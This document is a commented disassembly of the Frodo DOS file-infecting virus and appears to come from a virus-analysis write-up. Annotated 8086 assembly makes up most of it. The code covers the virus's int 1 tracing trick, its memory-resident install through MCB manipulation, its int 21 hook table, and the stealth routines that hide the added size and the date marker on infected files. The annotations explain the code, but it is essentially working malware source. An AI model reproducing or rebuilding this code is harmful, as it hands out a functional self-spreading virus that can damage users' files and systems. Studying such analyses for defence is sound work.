10A0  E2 F6 FD 80 36 E7 7C 01-80 36 D7 7C 28 80 36 E2  bv}.6g|..6W|(.6b
10B0  7C 28 C3 83 E3 03 8A 87-0A 7C 43 C3 06 53 33 DB  |(C.c....|CC.S3[
10C0  8E C3 8A D8 D1 E3 D1 E3-26 89 17 26 8C 5F 02 5B  .C.XQcQc&..&._.[
10D0  07 C3 E8 11 FD B2 80 E8-08 00 32 D2 E8 03 00 E9  .Ch.}2.h..2Rh..i
10E0  AA FD B8 01 02 E8 11 00-75 15 00 33 1B 70 00 00  *}8..h..u..3.p..
10F0  00 0F 50 12 7F 14 F8 0F-E5 0F 00 11 9A 0E 67 0C  ..P...x.e.....g.
1100  70 00 33 0E 2E 03 99 14-11 11 EF 8E 00 00 11 11  p.3.......o.....
1110  50 12 92 13 8E 8D 11 11-BF 22 E8 F8 F9 E8 8A 00  P.......?"hxyh..
-u cs:100 lcx

0100 E98502         JMP    0388           ;The first 3 words are Frodo's.
0103 6E
0104 150C

0106 637465         ;Most of the "Infected Program." message.
0109 64
010A 205072
010D 6F
010E 67
010F 7261
0111 6D
0112 2E200D
0115 0A24

0117 BA0201         MOV    DX,0102        ;Code to print "Infected
011A B409           MOV    AH,09          ;Program." message.
011C CD21           INT    21             ;This is part of the host
011E CD20           INT    20             ;program.

;From here on is the virus.
0120 00     ;CS:[0000] is set to zero, is probably unused.

0121 E9A700 ;CS:[0001] is a jump to Frodo's code start.
0124 EB15   ;CS:[0004] is the first word of the original program.
0126 496E   ;CS:[0006] is the second word of the original program.
0128 6665   ;CS:[0008] is the third word of the original program.

012A 6374   ;More of the EXE header.
012C 6564
012E 2050
0130 726F

0132 6772   ;CS:[0012] is the original SS from the EXE header.
0134 616D   ;CS:[0014] is the original SP from the EXE header.

0136 2E20

0138 0D0A   ;CS:[0018] is the original IP from the EXE header.
013A 24BA   ;CS:[001A] is the original CS from the EXE header.

013C 0201
013E B409

0140 00     ;CS:[0020] tells whether a file is COM or EXE.

0141 FE3A

;-----------------------;
; Frodo's int 1 handler ;
;-----------------------;

;The Trap flag is automatically cleared by the CPU when it does an int 1 (to
;prevent infinite recursion).

;When CS:[1250] = 1, it means that the int 1 routine was started from Frodo's
;int 21 handler.

0143 55             PUSH   BP          ;Save BP.
0144 8BEC           MOV    BP,SP       ;Prepare for stack access.

0146 50             PUSH   AX          ;Save AX since it is modified.

0147 817E0400C0     CMP    Word Ptr [BP+04],C000  ;Check if call came
014C 730C           JNB    015A                   ;from BIOS.

014E 2EA14712       MOV    AX,CS:[1247]  ;Check if call came from DOS.
0152 394604         CMP    [BP+04],AX
0155 7603           JBE    015A

0157 58             POP    AX          ;Restore these and return if not from
0158 5D             POP    BP          ;DOS or BIOS.
0159 CF             IRET

;Jumps here if int 1 is interrupting either DOS or Disk Controller code.
;This isn't jumped to if TSRs or something like that is happening now.
;The int 1 just keeps happening until DOS or the Disk Controller is
;interrupted.
015A 2E803E501201   CMP    Byte Ptr CS:[1250],01
0160 7432           JZ     0194         ;Go to 0194 if CS:[1250] is 01.

0162 8B4604         MOV    AX,[BP+04]   ;Save CS of caller in memory.
0165 2EA32F12       MOV    CS:[122F],AX

0169 8B4602         MOV    AX,[BP+02]   ;Save IP of caller in memory.
016C 2EA32D12       MOV    CS:[122D],AX

0170 7215           JB     0187         ;Go to 0187 if CS:[1250] is 00.

;This is executed if CS:[1250] is 02.
0172 58             POP    AX
0173 5D             POP    BP

0174 2E8E16DD12     MOV    SS,CS:[12DD]  ;Set SS:SP to Frodo's stack since
0179 2E8B26DF12     MOV    SP,CS:[12DF]  ;int 1 is about to jump to Frodo.

017E 2EA0E512       MOV    AL,CS:[12E5]  ;Restore original int mask.
0182 E621           OUT    21,AL

0184 E9D90C         JMP    0E60     ;Go to the last part of a procedure.
                                    ;No need to clear Trap flag since it is
                                    ;already clear now since int 1 has been 
                                    ;done.

;Comes here when CS:[1250] is zero.
0187 816606FFFE     AND    Word Ptr [BP+06],FEFF  ;Clear Trap flag on stack.

018C 2EA0E512       MOV    AL,CS:[12E5]  ;Restore original int mask.
0190 E621           OUT    21,AL

0192 EBC3           JMP    0157   ;Go iret (to real handler or whatever).

;Comes here when CS:[1250] is one.
;This only happens after Frodo's int 21 has called the real int 21.
;  -It runs right at the very start of the real int 21 for four instructions,
;   then it disables itself.

0194 2EFE0E5112     DEC    Byte Ptr CS:[1251]  ;Decrement the counter.
0199 75BC           JNZ    0157      ;If it isn't zero yet then iret.

019B 816606FFFE     AND    Word Ptr [BP+06],FEFF  ;Clear Trap flag on stack.
01A0 E86C0D         CALL   0F0F     ;Save registers on Frodo's stack.
01A3 E8340D         CALL   0EDA   ;Go and replace orig. int 21 handler.
                                  ;Now it is the jump to Frodo.

01A6 2EC5163112     LDS    DX,CS:[1231]  ;Retrieve original int 1 addr.
01AB B001           MOV    AL,01
01AD E80C0F         CALL   10BC    ;Set int 1 address.

01B0 E8530D         CALL   0F06    ;Restore registers off Frodo's stack.

01B3 EBD2           JMP    0187    ;Go to 0187 (clear Trap flag and IRET).
;End of int 1 handler.

;*******************************************************************************
;Procedure -- Set ES:BX to the address of the interrupt in AL.
01B5 1E             PUSH   DS           ;Save modified registers.
01B6 56             PUSH   SI

01B7 33F6           XOR    SI,SI        ;Set DS = 0000.
01B9 8EDE           MOV    DS,SI

01BB 32E4           XOR    AH,AH        ;Clear AH.
01BD 8BF0           MOV    SI,AX        ;Move int number to SI.
01BF D1E6           SHL    SI,1         ;Multiply it by four
01C1 D1E6           SHL    SI,1         ;to get the right offset.
01C3 8B1C           MOV    BX,[SI]      ;Get IP of vector.
01C5 8E4402         MOV    ES,[SI+02]   ;Get CS of vector.

01C8 5E             POP    SI           ;Restore modified registers.
01C9 1F             POP    DS
01CA C3             RET

;The original part RETFs to here when the host is a COM file.
;When the host is an EXE file then it is jumped to from CS:0001.
01CB 2EC7065B130016 MOV    Word Ptr CS:[135B],1600  ;Set up Frodo's stack.
01D2 2EA3E312       MOV    CS:[12E3],AX   ;Original value of AX is saved.
01D6 B430           MOV    AH,30          ;Get DOS version number.
01D8 CD21           INT    21

01DA 2EA2EE12       MOV    CS:[12EE],AL   ;Save DOS version number in mem.

01DE 2E8C1E4512     MOV    CS:[1245],DS   ;Save original data segment.

01E3 B452           MOV    AH,52        ;Get list of ptrs to DOS internal info.
01E5 CD21           INT    21           ;Is undocumented.

01E7 268B47FE       MOV    AX,ES:[BX-02]  ;Get seg of 1st mem ctrl block
01EB 2EA34712       MOV    CS:[1247],AX   ;(is owned by DOS) and save it.

01EF 8EC0           MOV    ES,AX    ;Set ES = seg of 1st mem ctrl block.

01F1 26A10100       MOV    AX,ES:[0001]  ;Get PSP segment of owner of
01F5 2EA34912       MOV    CS:[1249],AX  ;mem block and save it in mem.

01F9 0E             PUSH   CS            ;Set DS = CS.
01FA 1F             POP    DS

01FB B001           MOV    AL,01         ;Get vector of int 1.
01FD E8B5FF         CALL   01B5

0200 891E3112       MOV    [1231],BX     ;Save address to memory.
0204 8C063312       MOV    [1233],ES

0208 B021           MOV    AL,21         ;Get vector of int 21.
020A E8A8FF         CALL   01B5

020D 891E2D12       MOV    [122D],BX     ;Save address to memory.
0211 8C062F12       MOV    [122F],ES

0215 C606501200     MOV    Byte Ptr [1250],00  ;Set the int 1 flag up.

021A BA2300         MOV    DX,0023
021D B001           MOV    AL,01
021F E89A0E         CALL   10BC          ;Set vector of int 1 to DS:DX.

0222 9C             PUSHF                ;Put flags in AX.
0223 58             POP    AX

0224 0D0001         OR     AX,0100       ;Set Trap flag.
0227 50             PUSH   AX         ;Push AX on the stack...

0228 E421           IN     AL,21         ;Save original int mask.
022A A2E512         MOV    [12E5],AL

022D B0FF           MOV    AL,FF         ;Mask out all hardware ints.
022F E621           OUT    21,AL

0231 9D             POPF              ;...and pop it into Flags register.

0232 B452           MOV    AH,52         ;Get "list of lists."
0234 9C             PUSHF
0235 FF1E2D12       CALL   FAR [122D]    ;Call original int 21.

0239 9C             PUSHF                ;Put flags into AX.
023A 58             POP    AX

023B 25FFFE         AND    AX,FEFF       ;Clear Trap flag.

023E 50             PUSH   AX            ;Put AX back into flags register.
023F 9D             POPF

0240 A0E512         MOV    AL,[12E5]     ;Restore original int mask.
0243 E621           OUT    21,AL

0245 1E             PUSH   DS            ;Save DS.

0246 C5163112       LDS    DX,[1231]     ;Set vector of int 1 to DS:DX.
024A B001           MOV    AL,01         ;(Original address.)
024C E86D0E         CALL   10BC

024F 1F             POP    DS            ;Restore DS.

0250 C43E2D12       LES    DI,[122D]     ;Put address of original int 21
0254 893E3512       MOV    [1235],DI     ;in ES:DI and save it in another
0258 8C063712       MOV    [1237],ES     ;place.

;This sets up a 5 byte jump that replaces first 5 bytes of original int 21.
025C C6064B12EA     MOV    Byte Ptr [124B],EA    ;Put a jmp in buffer.
0261 C7064C12CC02   MOV    Word Ptr [124C],02CC  ;Offset of Frodo to jump to.
0267 8C0E4E12       MOV    [124E],CS             ;Segment of Frodo to jump to.

026B E86C0C         CALL   0EDA   ;Go and replace orig. int 21 handler.

026E B8004B         MOV    AX,4B00      ;Execute program function.
                                        ;This is basically to set up data at
                                        ;CS:1252.

0271 8826E212       MOV    [12E2],AH    ;Put function call in memory????

0275 BA2100         MOV    DX,0021
0278 FF362000       PUSH   [0020]
027C CD21           INT    21

027E 8F062000       POP    [0020]                    ;?
0282 268345FC09     ADD    Word Ptr ES:[DI-04],+09   ;?
0287 90             NOP                              ;?

0288 8E064512       MOV    ES,[1245]  ;Set ES = segment of host program.
028C 8E1E4512       MOV    DS,[1245]  ;Set DS = segment of host program.

;The next part modifies the MCB of the host program,
;namely the "First Unused Segment" field of the MCB.
0290 812E02006101   SUB    Word Ptr [0002],0161  ;Set FUS to what it would
                                                      ;be without Frodo.
0296 8B2E0200       MOV    BP,[0002]  ;Move First Unused Segment to BP.
029A 8CDA           MOV    DX,DS      ;Move host segment to DX.
029C 2BEA           SUB    BP,DX      ;Subtract FUS from Host Segment.
;BP now has the number of paragraphs used by the host program.

;Frodo resizes the host's memory block to the largest possible to clear
;out some space for Frodo to install itself above the host's position.
029E B44A           MOV    AH,4A           ;Resize memory block.
02A0 BBFFFF         MOV    BX,FFFF         ;Returns max block size.
02A3 CD21           INT    21

02A5 B44A           MOV    AH,4A           ;Resize memory block.
02A7 CD21           INT    21              ;Block size is max block size.


02A9 4A             DEC    DX      ;DX is now segment of host program's MCB.
02AA 8EDA           MOV    DS,DX   ;Access host's MCB.

02AC 803E00005A     CMP    Byte Ptr [0000],5A  ;Check if it is last MCB.
02B1 7405           JZ     02B8                ;If so then go to 02B8.

02B3 2EFE0EE212     DEC    Byte Ptr CS:[12E2]
02B8 2E803EE21200   CMP    Byte Ptr CS:[12E2],00
02BE 7405           JZ     02C5

02C0 C60600004D     MOV    Byte Ptr [0000],4D  ;Make it NOT the last MCB.

02C5 A10300         MOV    AX,[0003]       ;Get size of mem controlled by MCB
                                           ;but doesn't count the MCB itself.
02C8 8BD8           MOV    BX,AX    ;Put it in BX.
02CA 2D6101         SUB    AX,0161  ;Subtract # of paragraphs used by
                                         ;Frodo, leaving only the # used by
                                         ;the host.
02CD 03D0           ADD    DX,AX  ;DX is now the seg at end of host.

02CF A30300         MOV    [0003],AX  ;Put new # of pgraphs controlled in
                                           ;the MCB (now doesn't count Frodo).

;The next section makes a new MCB for Frodo.
02D2 42             INC    DX  ;DX is now the seg of the new MCB of Frodo.
                                    ;It points to the seg after the last seg
                                    ;of the host.
02D3 8EC2           MOV    ES,DX   ;Point ES at the MCB-to-be.
02D5 26C60600005A   MOV    Byte Ptr ES:[0000],5A  ;Set it to the last MCB.

02DB 2EFF364912     PUSH   CS:[1249]   ;Set the owner of the new MCB to
02E0 268F060100     POP    ES:[0001]   ;be DOS (Cute trick).

02E5 26C70603006001 MOV    Word Ptr ES:[0003],0160  ;Set the MCB to control
                                                    ;160 pgraphs (Frodo's size).

;Now Frodo is copied to the new memory block.
02EC 42             INC    DX      ;Set ES = seg of new mem block.
02ED 8EC2           MOV    ES,DX

02EF 0E             PUSH   CS          ;Set DS = CS.
02F0 1F             POP    DS

02F1 B9000B         MOV    CX,0B00   ;Length of Frodo in words.

02F4 BEFE15         MOV    SI,15FE    ;Copy Frodo from DS:SI to ES:DI.
02F7 8BFE           MOV    DI,SI      ;Copies from high to low because
02F9 FD             STD               ;the two locations overlap each
02FA F3             REPZ              ;other and Frodo could be screwed.
02FB A5             MOVSW

02FC FC             CLD               ;Memory operations go up.

;Now set up to go to the new copy of Frodo.
02FD 06             PUSH   ES         ;Set up to RETF to the new copy.
02FE B8EE01         MOV    AX,01EE
0301 50             PUSH   AX

;Reset host's MCB to the size it would be before Frodo's infection.
0302 2E8E064512     MOV    ES,CS:[1245]   ;Set ES = seg of host.
0307 B44A           MOV    AH,4A          ;Resize memory block.
0309 8BDD           MOV    BX,BP   ;Number of pgraphs taken by host only.
030B CD21           INT    21

030D CB             RETF      ;Jump to the new copy (goes to next line).

030E E8C90B         CALL   0EDA   ;Replace jump with orig. int 21 handler.
0311 2E8C0E4E12     MOV    CS:[124E],CS  ;Update jmp statement for new loc.
0316 E8C10B         CALL   0EDA   ;Replace orig. int 21 handler with jump.

0319 0E             PUSH   CS              ;Set DS = CS.
031A 1F             POP    DS

031B C606A21214     MOV    Byte Ptr [12A2],14  ;Set # of free table entries to 14.

0320 0E             PUSH   CS              ;Set ES = CS.
0321 07             POP    ES

0322 BF5212         MOV    DI,1252    ;Fill the PSP table with 0000 entries.
0325 B91400         MOV    CX,0014
0328 33C0           XOR    AX,AX
032A F3             REPZ              ;Do it.
032B AB             STOSW

032C A2EF12         MOV    [12EF],AL   ;Set this flag to zero.

032F A14512         MOV    AX,[1245]    ;Set EX = seg of host program.
0332 8EC0           MOV    ES,AX

0334 26C5160A00     LDS    DX,ES:[000A]  ;Get Termination Addr. from PSP.

0339 8ED8           MOV    DS,AX          ;?
033B 051000         ADD    AX,0010        ;?
033E 2E01061A00     ADD    CS:[001A],AX   ;?

0343 2E803E200000   CMP    Byte Ptr CS:[0020],00  ;Check if this is a COM
                                                       ;file.
0349 7524           JNZ    036F    ;If not then go to exit for EXE file.

;Returns control to a host COM file.
034B FB             STI

034C 2EA10400       MOV    AX,CS:[0004]   ;Restore first three words of
0350 A30001         MOV    [0100],AX      ;the COM file.
0353 2EA10600       MOV    AX,CS:[0006]
0357 A30201         MOV    [0102],AX
035A 2EA10800       MOV    AX,CS:[0008]
035E A30401         MOV    [0104],AX

0361 2EFF364512     PUSH   CS:[1245]      ;Set up to RETF back to the
0366 B80001         MOV    AX,0100        ;COM file's start.
0369 50             PUSH   AX

036A 2EA1E312       MOV    AX,CS:[12E3]   ;Restore original value of AX.

036E CB             RETF               ;RETF back to COM program start.

;Returns control to a host EXE file.
036F 2E01061200     ADD    CS:[0012],AX
0374 2EA1E312       MOV    AX,CS:[12E3]  ;Restore AX.
0378 2E8E161200     MOV    SS,CS:[0012]  ;Restore original SS.
037D 2E8B261400     MOV    SP,CS:[0014]  ;Restore original SP.
0382 FB             STI
0383 2EFF2E1800     JMP    FAR CS:[0018]   ;Jump to original CS:IP.

;-----------------------;
;COM files jump to here ;
;-----------------------;
0388 81FC0001       CMP    SP,0100      ;?
038C 7702           JA     0390         ;?

038E 33E4           XOR    SP,SP        ;?
0390 8BE8           MOV    BP,AX        ;?

0392 E80000         CALL   0395         ;Get address of code in memory.
0395 59             POP    CX
0396 81E97502       SUB    CX,0275      ;Calculate offset of virus start.

;Adjust CS so that CS:0000 is the start of the virus.
;It does this by taking the current CS and the offset of the virus' start
;in it and converting it to an absolute address and then back into CS:IP
;form, with IP=0000.
039A 8CC8           MOV    AX,CS        ;Convert address in CS:CX to
039C BB1000         MOV    BX,0010      ;an absolute address.
039F F7E3           MUL    BX
03A1 03C1           ADD    AX,CX
03A3 83D200         ADC    DX,+00
03A6 F7F3           DIV    BX           ;Change it back to seg/offset.

;Sets up a jump to the main install routine.
03A8 50             PUSH   AX           ;Push segment onto stack.
03A9 B8AB00         MOV    AX,00AB      ;Push offset onto stack.
03AC 50             PUSH   AX
03AD 8BC5           MOV    AX,BP
03AF CB             RETF                ;Jump to main part (line 01CB here).

;------------------------------------;
; Table of int 21 functions and the  ;
; addresses to call when they're run ;
;------------------------------------;

03B0 307C07    ;fn 30 - Get DOS version number.
03B3 234E04    ;fn 23 - Get file size.
03B6 378B0E    ;fn 37 - Undoc. Get or set switch character ('/' or '-').
03B9 4B8B05    ;fn 4B - Execute program.
03BC 3CD504    ;fn 3C - Create file.
03BF 3D1105    ;fn 3D - Open file.
03C2 3E5505    ;fn 3E - Close file.
03C5 0F9B03    ;fn 0F - Open file with FCB.
03C8 14CD03    ;fn 14 - Sequential read with FCB.
03CB 21C103    ;fn 21 - Random read with FCB.
03CE 27BF03    ;fn 27 - Random block read with FCB.
03D1 115903    ;fn 11 - Find first file with FCB.
03D4 125903    ;fn 12 - Find next file with FCB.
03D7 4E9F04    ;fn 4E - Find first file.
03DA 4F9F04    ;fn 4F - Find next file.
03DD 3FA50A    ;fn 3F - Read file or device.
03E0 408A0B    ;fn 40 - Write file or device.
03E3 42900A    ;fn 42 - Set file pointer.
03E6 57410A    ;fn 57 - Get or set file date or time.
03E9 48340E    ;fn 48 - Allocate memory block.


;-----------------------------;
;Frodo's interrupt 21 handler ;
;-----------------------------;

;Frodo activates int 1 during its int 21.

03EC 3D004B         CMP    AX,4B00       ;?
03EF 7504           JNZ    03F5          ;?
03F1 2EA2E212       MOV    CS:[12E2],AL  ;?

03F5 55             PUSH   BP       ;Set up for stack access.
03F6 8BEC           MOV    BP,SP

03F8 FF7606         PUSH   [BP+06]    ;Get flags out of stack,
03FB 2E8F06B312     POP    CS:[12B3]  ;and put them in memory.

0400 5D             POP    BP     ;Restore original BP and push it on
0401 55             PUSH   BP     ;stack again (Is popped off later).

0402 8BEC           MOV    BP,SP  ;Move SP to BP again.

0404 E8080B         CALL   0F0F     ;Save registers on Frodo's stack.

0407 E8D00A         CALL   0EDA   ;Patch orig. int 21 handler.
                                  ;Now it's what it's supposed to be.

040A E89A0A         CALL   0EA7   ;Save orig Break flag & set it to zero.

040D E8F60A         CALL   0F06   ;Restore registers off Frodo's stack.

0410 E8B40A         CALL   0EC7   ;Save all registers.

0413 53             PUSH   BX     ;Save BX.
0414 BB9002         MOV    BX,0290     ;Set up to access function table.                              
0417 2E3A27         CMP    AH,CS:[BX] ;Is current fn in this table entry?
041A 7509           JNZ    0425       ;No, so go increment pointer.
041C 2E8B5F01       MOV    BX,CS:[BX+01] ;Get address in table entry.
0420 875EEC         XCHG   BX,[BP-14]  ;[BP-14] is top of stack.
0423 FC             CLD          ;Memory operations go up.
0424 C3             RET    ;Now jump to address put on stack by XCHG cmd.

0425 83C303         ADD    BX,+03  ;Set up to access next table entry.
0428 81FBCC02       CMP    BX,02CC  ;Is pointer past end of the table?
042C 72E9           JB     0417    ;No, so go back.

;Function isn't in table, so go restore everything and jump to the real 
;int 21 (after setting up int 1).

042E 5B             POP    BX   ;This is to straighten out the stack if
                                     ;the RET isn't called.

;Set up everything and call the original int 21.
042F E8890A         CALL   0EBB   ;Restore original Break flag.

0432 E421           IN     AL,21    ;Save original interrupt mask.
0434 2EA2E512       MOV    CS:[12E5],AL

0438 B0FF           MOV    AL,FF    ;Mask out ALL ints (except IRQ2).
043A E621           OUT    21,AL

043C 2EC606511204   MOV    Byte Ptr CS:[1251],04  ;Set counter so that 4 instructions
                                                  ;are executed before Frodo's int 1
                                                  ;disables itself (see text).

0442 2EC606501201   MOV    Byte Ptr CS:[1250],01  ;Set int 1 flag to show that
                                                  ;Frodo's int 21 is going now.

0448 E8F10A         CALL   0F3C   ;Save orig. int 1 addr. and replace it.

044B E8A50A         CALL   0EF3         ;Restore all registers.

044E 50             PUSH   AX         ;Save AX.

044F 2EA1B312       MOV    AX,CS:[12B3]   ;Get orig. flags from memory.
0453 0D0001         OR     AX,0100        ;Set TRAP flag.

0456 50             PUSH   AX     ;Put flags in the flags register.
0457 9D             POPF

0458 58             POP    AX        ;Restore AX.
0459 5D             POP    BP        ;Restore BP.

045A 2EFF2E3512     JMP    FAR CS:[1235]  ;Original int 21 address.

;Set up everything and iret to the calling program.
045F E8AD0A         CALL   0F0F     ;Save registers on Frodo's stack.
0462 E8560A         CALL   0EBB   ;Restore original break flag.
0465 E8720A         CALL   0EDA   ;Go and replace orig. int 21 handler.
0468 E89B0A         CALL   0F06   ;Restore registers off Frodo's stack.

046B 5D             POP    BP         ;Get BP off of stack
046C 55             PUSH   BP         ;and save it again.

046D 8BEC           MOV    BP,SP      ;Put old flags in the stack so
046F 2EFF36B312     PUSH   CS:[12B3]  ;they will be popped back into
0474 8F4606         POP    [BP+06]    ;the Flags register by the iret.
0477 5D             POP    BP
0478 CF             IRET              ;Go back to the calling program.
;End of int 21.


;------------------------------------------;
; Functions 11 and 12 handler starts here. ;
;------------------------------------------;
;Function 11 - Find first file using FCB.
;Function 12 - Find next file using FCB.

0479 E8770A         CALL   0EF3         ;Restore all registers.
047C E8350B         CALL   0FB4         ;Go run INT 21.

047F 0AC0           OR     AL,AL     ;Was function successful (AL=0)?
0481 75DC           JNZ    045F      ;If not then return.

0483 E8410A         CALL   0EC7       ;Save all registers.

0486 E81802         CALL   06A1       ;Get current DTA addr. in DS:BX.
                                           ;Start of DTA is also start of FCB.
0489 B000           MOV    AL,00
048B 803FFF         CMP    Byte Ptr [BX],FF  ;Check if it is an extended FCB.
048E 7506           JNZ    0496        ;If not then go to 0496.

0490 8A4706         MOV    AL,[BX+06]  ;Put file attrib from ext. FCB into AL.

0493 83C307         ADD    BX,+07      ;Adjust for extended FCB.

0496 2E2006F012     AND    CS:[12F0],AL   ;AND file's attrib. with byte at CS:12F0.

049B F6471A80       TEST   Byte Ptr [BX+1A],80  ;Check file's date to see if
049F 7415           JZ     04B6                 ;100 yrs have been added.

04A1 806F1AC8       SUB    Byte Ptr [BX+1A],C8  ;If so then adjust it.

04A5 2E803EF01200   CMP    Byte Ptr CS:[12F0],00  ;Check if file's system attrib. is zero.
04AB 7509           JNZ    04B6       ;If so then skip the size adjust part.

04AD 816F1D0010     SUB    Word Ptr [BX+1D],1000  ;Adjust infected file size.
04B2 835F1F00       SBB    Word Ptr [BX+1F],+00

04B6 E83A0A         CALL   0EF3         ;Restore all registers.
04B9 EBA4           JMP    045F   ;Set up and IRET to calling program.

;----------------------------------;
; Function 0F handler starts here. ;
;----------------------------------;
;Function 0F - Open file using FCB.
04BB E8350A         CALL   0EF3         ;Restore all registers.
04BE E8F30A         CALL   0FB4         ;Go run INT 21.

04C1 E8030A         CALL   0EC7       ;Save all registers.
04C4 0AC0           OR     AL,AL  ;Is AL equal to zero (was there an error)?
04C6 75EE           JNZ    04B6   ;If so then go back and iret to caller.

04C8 8BDA           MOV    BX,DX     ;FCB is in DS:DX.

04CA F6471580       TEST   Byte Ptr [BX+15],80  ;Has fdate had 100 years added to it?
04CE 74E6           JZ     04B6  ;If not then go back and iret to caller.

04D0 806F15C8       SUB    Byte Ptr [BX+15],C8  ;Adjust file date.

04D4 816F100010     SUB    Word Ptr [BX+10],1000  ;Adjust file size.
04D9 805F1200       SBB    Byte Ptr [BX+12],00

04DD EBD7           JMP    04B6    ;Restore registers and then iret.

;----------------------------------;
; Function 27 handler starts here. ;
;----------------------------------;
;Function 27 - Random block read using FCB.

04DF E31B           JCXZ   04FC   ;If reading zero blocks then go back.

;----------------------------------;
; Function 21 handler starts here. ;
;----------------------------------;
;Function 21 - Random read using FCB.

04E1 8BDA           MOV    BX,DX     ;DS:DX points at the FCB.

04E3 8B7721         MOV    SI,[BX+21]   ;?
04E6 0B7723         OR     SI,[BX+23]   ;?

04E9 7511           JNZ    04FC         ;?
04EB EB0A           JMP    04F7         ;?

;----------------------------------;
; Function 14 handler starts here. ;
;----------------------------------;
;Function 14 - Sequential read using FCB.

04ED 8BDA           MOV    BX,DX     ;DS:DX points at the FCB.

04EF 8B470C         MOV    AX,[BX+0C]    ;?
04F2 0A4720         OR     AL,[BX+20]    ;?

04F5 7505           JNZ    04FC          ;?

04F7 E83F05         CALL   0A39   ;Check if the file is a program.
04FA 7303           JNB    04FF   ;If so then go to 04FF.
04FC E930FF         JMP    042F   ;Set up and call original int 21.

04FF E8F109         CALL   0EF3         ;Restore all registers.
0502 E8C209         CALL   0EC7         ;Save all registers.
0505 E8AC0A         CALL   0FB4         ;Call the original int 21.

;Frodo puts these in the stack so that they will be popped off later.
0508 8946FC         MOV    [BP-04],AX   ;Put AX value on the stack.
050B 894EF8         MOV    [BP-08],CX   ;Put CX value on the stack.

050E 1E             PUSH   DS    ;Save DS:DX (pointer to FCB).
050F 52             PUSH   DX

0510 E88E01         CALL   06A1       ;Get current DTA addr. in DS:BX.

0513 837F1401       CMP    Word Ptr [BX+14],+01  ;Check if IP is 0001.
0517 740F           JZ     0528  ;If so then goto 0528 (file already infected).

0519 8B07           MOV    AX,[BX]    ;Add up the first 3 words of the file.
051B 034702         ADD    AX,[BX+02]
051E 034704         ADD    AX,[BX+04]
0521 7405           JZ     0528       ;If the sum is zero then go to 0528.

0523 83C404         ADD    SP,+04  ;Adjust the stack (get DS and DX off).
0526 EB8E           JMP    04B6    ;Restore registers and then iret.

;Routine jumps here if the file being read is infected.
0528 5A             POP    DX    ;Restore DS:DX (pointer to FCB).
0529 1F             POP    DS

052A 8BF2           MOV    SI,DX   ;Prepare to copy caller's FCB into Frodo.
052C 0E             PUSH   CS             ;Set ES = CS.
052D 07             POP    ES
052E BFB512         MOV    DI,12B5

0531 B92500         MOV    CX,0025
0534 F3             REPZ             ;Copy the caller's FCB into Frodo.
0535 A4             MOVSB

0536 BFB512         MOV    DI,12B5    ;Set DS:DI to point to the FCB copy.
0539 0E             PUSH   CS             ;Set DS = CS.
053A 1F             POP    DS

053B 8B4510         MOV    AX,[DI+10]  ;Put file size in DX:AX.
053E 8B5512         MOV    DX,[DI+12]

0541 050F10         ADD    AX,100F        ;Adjust infected file's size
0544 83D200         ADC    DX,+00         ;to what it really is.
0547 25F0FF         AND    AX,FFF0
054A 894510         MOV    [DI+10],AX     ;Save it in the FCB.
054D 895512         MOV    [DI+12],DX

0550 2DFC0F         SUB    AX,0FFC        ;Now point at the bytes displaced
0553 83DA00         SBB    DX,+00         ;from infected file's start.
0556 894521         MOV    [DI+21],AX     ;Save it in the FCB.
0559 895523         MOV    [DI+23],DX

055C C7450E0100     MOV    Word Ptr [DI+0E],0001   ;?
0561 B91C00         MOV    CX,001C                 ;?
0564 8BD7           MOV    DX,DI                   ;?

0566 B427           MOV    AH,27        ;Random block read (with FCB).
0568 E8490A         CALL   0FB4         ;Go run INT 21.

056B E948FF         JMP    04B6    ;Restore registers and then iret.

;----------------------------------;
; Function 23 handler starts here. ;
;----------------------------------;
;Function 23 - Get file size for FCB.

056E 0E             PUSH   CS             ;Set ES = CS.
056F 07             POP    ES

0570 8BF2           MOV    SI,DX     ;Copy the caller's FCB into Frodo.
0572 BFB512         MOV    DI,12B5
0575 B92500         MOV    CX,0025
0578 F3             REPZ
0579 A4             MOVSB

057A 1E             PUSH   DS      ;DS:DX points to the FCB.
057B 52             PUSH   DX

057C 0E             PUSH   CS             ;Set DS = CS.
057D 1F             POP    DS

057E BAB512         MOV    DX,12B5      ;Point at FCB copy in Frodo.
0581 B40F           MOV    AH,0F        ;Open file with FCB.
0583 E82E0A         CALL   0FB4         ;Go run INT 21.

0586 B410           MOV    AH,10        ;Close file with FCB.
0588 E8290A         CALL   0FB4         ;Go run INT 21.

058B F606CA1280     TEST   Byte Ptr [12CA],80  ;Check the date for 100 years more.

0590 5E             POP    SI     ;Now DS:SI points to the FCB.
0591 1F             POP    DS

0592 747E           JZ     0612    ;If not then go and run the original int 21.

0594 2EC41EC512     LES    BX,CS:[12C5]  ;Put file size in ES:BX.

0599 8CC0           MOV    AX,ES  ;Move ES into AX to work with it.

059B 81EB0010       SUB    BX,1000  ;Subtract Frodo's length from the
059F 1D0000         SBB    AX,0000  ;file's size.

05A2 33D2           XOR    DX,DX

05A4 2E8B0EC312     MOV    CX,CS:[12C3]     ;? (something in the FCB in Frodo)
05A9 49             DEC    CX               ;?
05AA 03D9           ADD    BX,CX            ;?
05AC 150000         ADC    AX,0000          ;?
05AF 41             INC    CX               ;?
05B0 F7F1           DIV    CX               ;?
05B2 894423         MOV    [SI+23],AX       ;?
05B5 92             XCHG   AX,DX            ;?
05B6 93             XCHG   AX,BX            ;?
05B7 F7F1           DIV    CX               ;?
05B9 894421         MOV    [SI+21],AX       ;?

05BC E9F7FE         JMP    04B6    ;Restore registers and then iret.

;------------------------------------------;
; Functions 4E and 4F handler starts here. ;
;------------------------------------------;
;Function 4E - Find first file.
;Function 4F - Find next file.

;This procedure calls the original functions and then adjusts the results.

05BF 2E8326B312FE   AND    Word Ptr CS:[12B3],FFFE  ;Clear Carry flag.

05C5 E82B09         CALL   0EF3         ;Restore all registers.
05C8 E8E909         CALL   0FB4         ;Go run INT 21.
05CB E8F908         CALL   0EC7         ;Save all registers.

05CE 7309           JNB    05D9   ;If no problems then go to 05D9.

05D0 2E830EB31201   OR     Word Ptr CS:[12B3],+01  ;Set Carry flag.
05D6 E9DDFE         JMP    04B6    ;Restore registers and then iret.

05D9 E8C500         CALL   06A1       ;Get current DTA addr. in DS:BX.
05DC F6471980       TEST   Byte Ptr [BX+19],80
05E0 7503           JNZ    05E5
05E2 E9D1FE         JMP    04B6    ;Restore registers and then iret.

05E5 816F1A0010     SUB    Word Ptr [BX+1A],1000    ;Adjust results.
05EA 835F1C00       SBB    Word Ptr [BX+1C],+00
05EE 806F19C8       SUB    Byte Ptr [BX+19],C8
